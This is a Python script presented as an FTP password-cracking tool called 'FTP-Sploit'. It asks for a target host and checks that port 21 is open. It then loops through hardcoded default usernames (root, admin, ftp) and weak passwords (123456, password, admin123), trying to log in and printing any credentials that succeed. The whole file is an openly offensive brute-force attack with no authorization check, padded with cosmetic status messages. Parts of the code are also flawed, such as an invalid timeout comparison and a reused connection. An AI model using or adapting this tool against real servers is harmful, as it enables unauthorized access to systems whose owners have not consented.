import ftplib
import socket
import time
import os
import random
import requests
import sys 
import colorama
from colorama import Fore
from colorama import Style

colorama.init()

os.system('cls' if os.name == 'nt' else 'clear')
print("")
print(Fore.BLUE + Style.BRIGHT + '''
 _____ _____ _____ _____     _     _ _   
|   __|_   _|  _  |   __|___| |___|_| |_ 
|   __| | | |   __|__   | . | | . | |  _|
|__|    |_| |__|  |_____|  _|_|___|_|_|  
                        |_|              
            FTP-Sploit
     Tools Cracked Password''' + Style.RESET_ALL)
print(" Copyright : Pham Chien")
print("")
print("Dont Talk http:// or https:// ( ex : Url : ex.com )")
print("")
url = input("url : ")
response = requests.get("http://" + url)
print("")
print(Fore.GREEN + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" checking " + Fore.GREEN + Style.BRIGHT + f"{url}" + Style.RESET_ALL + " status : " + Fore.GREEN + Style.BRIGHT + f"{response.status_code}"))
time.sleep(0.30)

if response.status_code == 200:

    port = 21
    get_ip = socket.gethostbyname(url)

    print("")
    print(Fore.YELLOW + "[-]" + Style.BRIGHT + Style.RESET_ALL + (f" set host : " + Fore.GREEN + Style.BRIGHT + f"{url}"))
    time.sleep(2)
    print(Fore.YELLOW + "[-]" + Style.BRIGHT + Style.RESET_ALL + (f" host address : " + Fore.GREEN + Style.BRIGHT + f"{get_ip}" + Style.RESET_ALL + "...."))
    time.sleep(0.40)
    print(Fore.YELLOW + "[-]" + Style.BRIGHT + Style.RESET_ALL + (f" starting checking port...."))
    time.sleep(3)
    print("")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)

    code = s.connect_ex((url, port))

    if code == 0:
        print(Fore.RED + "[+]" + Style.BRIGHT + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + f" {get_ip}" + Fore.GREEN + Style.BRIGHT + Style.RESET_ALL + f" Is Opening Port " + Fore.GREEN + Style.BRIGHT + f"{port}")
        time.sleep(3)
        print(Fore.GREEN + "[-]" + Style.BRIGHT +Style.RESET_ALL + (f" Setting Up botton"))
        time.sleep(5)

        ftp = ftplib.FTP(url)

        # list random username, password

        username = [
            "root", 
            "admin", 
            "user",
            "ftp",
            "steve",
            "nullbyte",
        ]

        password = [
            "123456",
            "password", 
            "root", 
            "1234", 
            "PASSWORD",
            "abc",
            "abc123",
            "admin123",
        ]

        usernamess = random.choice(username)
        passwordss = random.choice(password)

        for usernames in username:
    
            for passwords in password:
                
                    print(Fore.GREEN + Style.BRIGHT + "[-]" + Style.RESET_ALL + (f" FTP Login Sweep Incorect"))
                    time.sleep(0.10)
                    print(Fore.YELLOW + Style.BRIGHT + "[*]" + Style.RESET_ALL + (f" Set Playload " + Fore.RED + Style.BRIGHT + f"( FTP CRACKED ) "))
                    time.sleep(0.30)
                    print(Fore.GREEN + Style.BRIGHT + "[-]" + Style.RESET_ALL + (f" Random Username, Password list"))
                    time.sleep(1)
                    print(Fore.GREEN + Style.BRIGHT + "[+]" + Style.RESET_ALL + (f" Starting Cracking USR, PWD For " + Fore.GREEN + Style.BRIGHT + f"{get_ip} "))
                    time.sleep(0.30)


                    try:
                        ftp.login(usernames, passwords)
                        print(Fore.GREEN + "[*]" + Style.BRIGHT + Style.RESET_ALL + (" IP : " + Fore.GREEN + Style.BRIGHT + f"{get_ip}" + Style.RESET_ALL))
                        print(Fore.GREEN + "[*]" + Style.BRIGHT + Style.RESET_ALL + (" PORT : " + Fore.GREEN + Style.BRIGHT + f"{port}" + Style.RESET_ALL))
                        print(Fore.GREEN + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Username : " + Fore.GREEN + Style.BRIGHT + f"{usernames}" + Style.RESET_ALL))
                        print(Fore.GREEN + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Password : " + Fore.GREEN + Style.BRIGHT + f"{passwords}" + Style.RESET_ALL))
                        print(Fore.GREEN + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Login " + Fore.GREEN + Style.BRIGHT + f"Success"))


                    except ftplib.error_perm:
                        print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (" IP : " + Fore.GREEN + Style.BRIGHT + f"{get_ip}" + Style.RESET_ALL))
                        print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (" PORT : " + Fore.GREEN + Style.BRIGHT + f"{port}" + Style.RESET_ALL))
                        print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Username : " + Fore.GREEN + Style.BRIGHT + f"{usernames}" + Style.RESET_ALL))
                        print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Password : " + Fore.GREEN + Style.BRIGHT + f"{passwords}" + Style.RESET_ALL))
                        print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Login " + Fore.RED + Style.BRIGHT + f"FAILED "))
                        time.sleep(0.30)

    elif code == s.timeout:
                print(f"[!] {get_ip} responsed time out")

    else:
        print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Port 21 Not Opening , Please Try Again !!! "))
        time.sleep(1)
        os.system('py main.py' if os.name == 'nt' else 'python main.py')

else:
    print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" {url} responsed time out"))
    os.system('py main.py' if os.name == 'nt' else 'python main.py')
